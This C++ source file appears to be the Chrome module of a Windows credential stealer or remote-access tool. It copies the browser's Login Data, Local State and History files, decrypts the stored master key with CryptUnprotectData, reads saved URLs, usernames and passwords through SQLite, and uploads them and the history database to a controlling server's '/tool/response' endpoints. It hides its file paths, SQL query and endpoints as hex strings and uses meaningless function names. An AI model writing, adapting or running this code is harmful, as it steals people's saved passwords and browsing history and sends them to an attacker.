#define _CRT_SECURE_NO_WARNINGS
#include "Chrome.h"

string Chrome::hexStr(BYTE* data, int len)
{
	std::stringstream ss;
	ss << std::hex;

	for (int i(0); i < len; ++i)
		ss << std::setw(2) << std::setfill('0') << (int)data[i];
	return ss.str();
}

string Chrome::xf1122()
{
	string tempPath = Utils::GetCurrentUserDirectory();
	if (tempPath.empty())
		return NULL;
	string fullPath = tempPath + Encryptions::hexToAscii("5c5c417070446174615c5c4c6f63616c5c5c476f6f676c655c5c4368726f6d655c5c5573657220446174615c5c44656661756c745c5c4c6f67696e2044617461");
	string copyFile = tempPath + Encryptions::hexToAscii("5c5c417070446174615c5c4c6f63616c5c5c476f6f676c655c5c4368726f6d655c5c5573657220446174615c5c44656661756c745c5c4c6f67696e2e6462");
	if (!CopyFileW(Utils::s2ws(fullPath).c_str(), Utils::s2ws(copyFile).c_str(), FALSE))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return NULL;
	}
	return copyFile;
}

string Chrome::xy617s(string pbDataInput)
{
	DATA_BLOB DataIn;
	DATA_BLOB DataVerify;
	DataIn.pbData = (BYTE*)pbDataInput.c_str();
	DataIn.cbData = (DWORD)pbDataInput.length();

	if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataVerify))
		return hexStr(DataVerify.pbData, DataVerify.cbData);
	else
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return NULL;
	}
}

void Chrome::AddToPasswords(string tempString)
{
	webPasswords = webPasswords + tempString;
}

int Chrome::callback(void* data, int argc, char** argv, char** azColName)
{
	Chrome* web = reinterpret_cast<Chrome*>(data);
	return web->callback2(argc, argv, azColName);
}

sqlite3* Chrome::OpenDatabase(string filePath)
{
	sqlite3* db;
	int rc = sqlite3_open(filePath.c_str(), &db);
	if (rc) {
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return NULL;
	}
	return db;
}

bool Chrome::ExecuteSqlCommand(sqlite3* db, string query)
{
	char* zErrMsg = 0;
	int rc = sqlite3_exec(db, query.c_str(), callback, this, &zErrMsg);
	if (rc != SQLITE_OK) {
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		sqlite3_free(zErrMsg);
		return false;
	}
	return true;
}

bool Chrome::jy8100s()
{
	string masterKey;
	string encPassword;
	string tempPath = Utils::GetCurrentUserDirectory();
	if (tempPath.empty())
		return false;
	string fullPath = tempPath + Encryptions::hexToAscii("5c5c417070446174615c5c4c6f63616c5c5c476f6f676c655c5c4368726f6d655c5c5573657220446174615c5c4c6f63616c205374617465");
	string copyFile = tempPath + Encryptions::hexToAscii("5c5c417070446174615c5c4c6f63616c5c5c476f6f676c655c5c4368726f6d655c5c5573657220446174615c5c4c6f67696e53746174652e6462");
	if (!CopyFileW(Utils::s2ws(fullPath).c_str(), Utils::s2ws(copyFile).c_str(), FALSE))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	ifstream f(copyFile);
	Value jsonData;
	CharReaderBuilder builder;
	builder["collectComments"] = false;
	JSONCPP_STRING err;
	if (!parseFromStream(builder, f, &jsonData, &err))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	else
	{
		string encodedMaster = jsonData["os_crypt"]["encrypted_key"].asString();
		string decodedData = Encryptions::base64Decode(encodedMaster);
		decodedData = decodedData.substr(5);
		masterKey = xy617s(decodedData);
		webPasswords = "{ \""+Encryptions::hexToAscii("6D61737465724B6579")+"\": \"" + masterKey + "\"";
	}
	string filePath = xf1122();
	if (filePath != "")
	{
		sqlite3* db = OpenDatabase(filePath);
		if (db == NULL) {
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			return false;
		}

		string query = Encryptions::hexToAscii("53454c45435420616374696f6e5f75726c2c757365726e616d655f76616c75652c70617373776f72645f76616c75652046524f4d206c6f67696e73");
		if (!ExecuteSqlCommand(db, &query[0]))
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		}
		sqlite3_close(db);
	}
	return true;
}

void Chrome::DownloadHistoryDB(PublicStructers::client clientInfo)
{
	string tempPath = Utils::GetCurrentUserDirectory();
	if (tempPath.empty())
		return;
	string fullPath = tempPath + Encryptions::hexToAscii("5C5C417070446174615C5C4C6F63616C5C5C476F6F676C655C5C4368726F6D655C5C5573657220446174615C5C44656661756C745C5C486973746F7279");
	string copyFilePath = tempPath + Encryptions::hexToAscii("5C5C417070446174615C5C4C6F63616C5C5C476F6F676C655C5C4368726F6D655C5C5573657220446174615C5C686973746F72792E6462");
	if (!CopyFileW(Utils::s2ws(fullPath).c_str(), Utils::s2ws(copyFilePath).c_str(), FALSE))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	UploadDownload uploadDownload;
	if (!uploadDownload.upload_to_server(copyFilePath, clientInfo))
	{
		WinHttpRequests.SendPostData(Encryptions::hexToAscii("4661696C656420746F2075706C6F616420686973746F727920444221"), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E7365"), clientInfo.clientId);
		return;
	}
	DeleteFileW(Utils::s2ws(copyFilePath.c_str()).c_str());
	WinHttpRequests.SendGetRequest(Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F686973746F7279"), clientInfo.session, clientInfo.clientId);
}

int Chrome::callback2(int argc, char** argv, char** azColName)
{
	id += 1;
	string encryptedPass = hexStr((BYTE*)argv[2], (int)strlen(argv[2]));
	char username[1000];
	sprintf(username, R"(%s)", argv[1]);
	string finalUser;
	string tempUser;
	for (int i = 0; i < int(strlen(username)); i++)
	{
		if (username[i] == '\\')
		{
			string part = string(username).substr(0, i + 1);
			tempUser = part + R"(\\\)" + string(username).substr(i + 1);
		}
	}
	if (!tempUser.empty())
		finalUser = tempUser;
	else
		finalUser = string(username);
	string tempString = ",\"" + to_string(id) + "\": "
		+ "[{\"url\": \"" + string(argv[0]) 
		+ "\"},{\"username\": \"" + finalUser 
		+ "\"},{\"password\": \"" + encryptedPass + "\"}]";
	webPasswords = webPasswords + tempString;
	return 0;
}

void Chrome::x81kiw23(PublicStructers::client clientInfo)
{
	string finalData;
	if (!jy8100s())
	{
		string var = Encryptions::hexToAscii("4368726f6d65206973206e6f7420696e7374616c6c6564206f72206e6f742061636365737369626c65");
		WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(var), clientInfo.session, Encryptions::hexToAscii("222F746F6F6C2F726573706F6E73652F70617373776F72647322"), clientInfo.clientId);
		return;
	}
	if (webPasswords.empty())
		finalData = Encryptions::hexToAscii("5b2d5d204661696c656420746f20676574207765622070617373776f72647321");
	else
		finalData = webPasswords + "}";
	WinHttpRequests.SendPostData(finalData, clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F70617373776F726473"), clientInfo.clientId);
}

